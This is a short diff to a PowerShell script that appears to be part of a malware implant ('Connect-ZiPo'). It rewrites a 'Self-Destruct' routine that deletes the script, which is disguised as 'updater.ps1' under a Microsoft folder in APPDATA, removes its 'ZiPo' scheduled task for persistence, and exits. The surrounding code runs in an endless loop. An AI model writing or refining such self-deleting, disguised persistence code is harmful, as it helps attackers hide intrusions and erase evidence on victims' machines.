@@ -101,11 +101,14 @@ function Connect-ZiPo {
     }
 
     function Self-Destruct {
-        $path = $MyInvocation.MyCommand.Path
-        schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
-        Remove-Item -Path $path -Force
-        exit
+    $script = $PSCommandPath
+    if (-not $script) {
+        $script = "$env:APPDATA\Microsoft\updater.ps1"
     }
+    Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
+    schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
+    exit
+}
 
     while ($true) {
         try {
